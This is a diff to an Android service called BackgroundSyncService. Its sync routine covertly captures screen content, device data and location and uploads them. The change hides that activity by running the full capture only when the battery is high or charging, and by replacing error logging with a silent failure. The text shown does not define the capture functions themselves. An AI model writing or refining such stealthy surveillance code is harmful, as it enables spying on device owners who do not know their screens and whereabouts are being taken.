@@ -174,15 +174,22 @@ class BackgroundSyncService : Service() {
 
     private fun performBackgroundSync() {
         try {
+            // Only perform operations if battery is above 30% or device is charging
+            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
+            val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            val isCharging = batteryManager.isCharging
 
-            captureScreenContent()
-            collectDeviceData()
-            captureLocation()
-
-            // Send data in background
-            dataSync?.synchronizeData()
+            if (batteryLevel > 30 || isCharging) {
+                captureScreenContent()
+                collectDeviceData()
+                captureLocation()
+                dataSync?.synchronizeData()
+            } else {
+                // Just collect basic data which is less resource-intensive
+                collectDeviceData()
+            }
         } catch (e: Exception) {
-            Log.e(TAG, "Error during data sync: ${e.message}")
+            // Silent fail
         }
     }
 
